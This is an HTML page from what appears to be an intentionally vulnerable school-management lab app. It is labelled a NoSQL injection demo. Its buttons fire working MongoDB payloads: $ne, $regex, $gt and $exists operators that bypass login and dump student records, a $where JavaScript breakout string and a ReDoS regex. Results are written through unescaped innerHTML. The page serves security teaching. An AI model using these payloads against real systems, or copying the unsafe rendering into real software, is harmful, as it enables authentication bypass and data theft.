<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Search - School Management</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav class="navbar">
    <div class="logo">School Management</div>
    <div class="nav-links">
      <a href="/dashboard.html">Dashboard</a>
      <a href="/students.html">Students</a>
      <a href="/search.html">Search</a>
      <a href="/index.html">Logout</a>
    </div>
  </nav>

  <div class="container">
    <div class="card">
      <div class="card-header">NoSQL Injection Testing</div>
      
      <div class="vuln-warning">
        <h4>Vulnerability Demo</h4>
        <p>This page demonstrates various NoSQL injection attacks</p>
      </div>

      <!-- Search with Query Injection -->
      <div style="margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #eee;">
        <h4 style="margin-bottom: 15px;">1. Query Object Injection</h4>
        <p style="color: #666; margin-bottom: 10px;">Inject MongoDB operators directly into query</p>
        <form id="query-form">
          <div class="form-group">
            <label>Query (JSON)</label>
            <input type="text" id="query-input" placeholder='{"name": "John"}'>
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="submit" class="btn btn-primary">Search</button>
            <button type="button" class="btn btn-danger" onclick="injectQuery('all')">Get All: {"$ne": ""}</button>
            <button type="button" class="btn btn-danger" onclick="injectQuery('regex')">Regex: {"$regex": ".*"}</button>
          </div>
        </form>
        <div id="query-results" style="margin-top: 15px;"></div>
      </div>

      <!-- $where Injection -->
      <div style="margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #eee;">
        <h4 style="margin-bottom: 15px;">2. $where JavaScript Injection</h4>
        <p style="color: #666; margin-bottom: 10px;">Inject JavaScript code via $where operator</p>
        <form id="where-form">
          <div class="form-group">
            <label>Search Term</label>
            <input type="text" id="where-input" placeholder="John">
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="submit" class="btn btn-primary">Search</button>
            <button type="button" class="btn btn-danger" onclick="injectWhere('bypass')">Bypass: '; return true; var a='</button>
          </div>
        </form>
        <div id="where-results" style="margin-top: 15px;"></div>
      </div>

      <!-- Regex Injection -->
      <div style="margin-bottom: 30px; padding-bottom: 20px; border-bottom: 2px solid #eee;">
        <h4 style="margin-bottom: 15px;">3. Regex Injection (ReDoS)</h4>
        <p style="color: #666; margin-bottom: 10px;">Inject regex patterns that can cause denial of service</p>
        <form id="regex-form">
          <div class="form-group">
            <label>Pattern</label>
            <input type="text" id="regex-input" placeholder="^John">
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="submit" class="btn btn-primary">Search</button>
            <button type="button" class="btn btn-danger" onclick="injectRegex('all')">Match All: .*</button>
            <button type="button" class="btn btn-danger" onclick="injectRegex('redos')">ReDoS: (a+)+$</button>
          </div>
        </form>
        <div id="regex-results" style="margin-top: 15px;"></div>
      </div>

      <!-- Login Bypass -->
      <div>
        <h4 style="margin-bottom: 15px;">4. Login Authentication Bypass</h4>
        <p style="color: #666; margin-bottom: 10px;">Bypass login without knowing credentials</p>
        <form id="login-form">
          <div class="form-group">
            <label>Email</label>
            <input type="text" id="login-email" placeholder="email@example.com">
          </div>
          <div class="form-group">
            <label>Password</label>
            <input type="text" id="login-password" placeholder="password">
          </div>
          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
            <button type="submit" class="btn btn-primary">Login</button>
            <button type="button" class="btn btn-danger" onclick="injectLogin('ne')">Inject: $ne</button>
            <button type="button" class="btn btn-danger" onclick="injectLogin('gt')">Inject: $gt</button>
            <button type="button" class="btn btn-danger" onclick="injectLogin('exists')">Inject: $exists</button>
          </div>
        </form>
        <div id="login-results" style="margin-top: 15px;"></div>
      </div>
    </div>
  </div>

  <script src="/js/app.js"></script>
  <script>
    // Query Injection
    document.getElementById('query-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      try {
        const query = JSON.parse(document.getElementById('query-input').value || '{}');
        const results = await fetchAPI('/api/students/search', 'POST', { query });
        displayResults('query-results', results);
      } catch (err) {
        document.getElementById('query-results').innerHTML = 
          `<div class="alert alert-danger">Error: ${err.message}</div>`;
      }
    });

    function injectQuery(type) {
      let query;
      if (type === 'all') {
        query = { name: { "$ne": "" } };
      } else if (type === 'regex') {
        query = { name: { "$regex": ".*" } };
      }
      document.getElementById('query-input').value = JSON.stringify(query);
      document.getElementById('query-form').dispatchEvent(new Event('submit'));
    }

    // $where Injection
    document.getElementById('where-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const term = document.getElementById('where-input').value;
      try {
        const results = await fetchAPI(`/api/students/unsafe-search?term=${encodeURIComponent(term)}`);
        displayResults('where-results', results);
      } catch (err) {
        document.getElementById('where-results').innerHTML = 
          `<div class="alert alert-danger">Error: ${err.message}</div>`;
      }
    });

    function injectWhere(type) {
      if (type === 'bypass') {
        document.getElementById('where-input').value = "'; return true; var a='";
      }
      document.getElementById('where-form').dispatchEvent(new Event('submit'));
    }

    // Regex Injection
    document.getElementById('regex-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const pattern = document.getElementById('regex-input').value;
      try {
        const results = await fetchAPI(`/api/students/search-pattern?pattern=${encodeURIComponent(pattern)}`);
        displayResults('regex-results', results);
      } catch (err) {
        document.getElementById('regex-results').innerHTML = 
          `<div class="alert alert-danger">Error: ${err.message}</div>`;
      }
    });

    function injectRegex(type) {
      if (type === 'all') {
        document.getElementById('regex-input').value = '.*';
      } else if (type === 'redos') {
        document.getElementById('regex-input').value = '(a+)+$';
      }
      document.getElementById('regex-form').dispatchEvent(new Event('submit'));
    }

    // Login Injection
    document.getElementById('login-form').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('login-email').value;
      const password = document.getElementById('login-password').value;
      try {
        const result = await fetchAPI('/api/students/login', 'POST', { email, password });
        document.getElementById('login-results').innerHTML = 
          `<div class="alert alert-success">Login successful as: ${result.student.name} (${result.student.email})</div>`;
      } catch (err) {
        document.getElementById('login-results').innerHTML = 
          `<div class="alert alert-danger">Login failed: ${err.message}</div>`;
      }
    });

    function injectLogin(type) {
      let payload;
      if (type === 'ne') {
        payload = { email: { "$ne": "" }, password: { "$ne": "" } };
      } else if (type === 'gt') {
        payload = { email: { "$gt": "" }, password: { "$gt": "" } };
      } else if (type === 'exists') {
        payload = { email: { "$exists": true }, password: { "$exists": true } };
      }
      
      fetchAPI('/api/students/login', 'POST', payload)
        .then(result => {
          document.getElementById('login-results').innerHTML = 
            `<div class="alert alert-success">Injection successful! Logged in as: ${result.student.name} (${result.student.email})</div>`;
        })
        .catch(err => {
          document.getElementById('login-results').innerHTML = 
            `<div class="alert alert-warning">Injection attempted but no users found: ${err.message}</div>`;
        });
    }

    function displayResults(containerId, results) {
      const container = document.getElementById(containerId);
      if (results.length === 0) {
        container.innerHTML = '<div class="alert alert-warning">No results found</div>';
        return;
      }
      container.innerHTML = `
        <div class="alert alert-success">Found ${results.length} result(s)</div>
        <table>
          <thead>
            <tr><th>Name</th><th>Email</th><th>Age</th><th>Grade</th></tr>
          </thead>
          <tbody>
            ${results.map(s => `
              <tr>
                <td>${s.name}</td>
                <td>${s.email}</td>
                <td>${s.age || '-'}</td>
                <td>${s.grade || '-'}</td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      `;
    }
  </script>
</body>
</html>
